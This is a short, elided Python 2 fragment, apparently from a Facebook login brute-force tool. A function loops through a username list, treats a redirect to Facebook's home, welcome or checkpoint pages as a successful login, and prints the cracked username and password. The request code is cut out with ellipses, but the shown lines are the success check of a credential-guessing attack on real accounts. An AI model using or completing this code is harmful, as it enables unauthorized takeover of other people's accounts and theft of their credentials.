...
def uface():
	...
	for username in usernamelist:
		...
		if r == 'https://www.facebook.com/' or r == 'https://www.facebook.com/checkpoint/?next' or r == 'https://www.facebook.com/?sk=welcome' or r == 'https://www.facebook.com/mobileprotection?source=mobile_mirror_nux':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % usernamelist
			print('{Password:%s}') % password
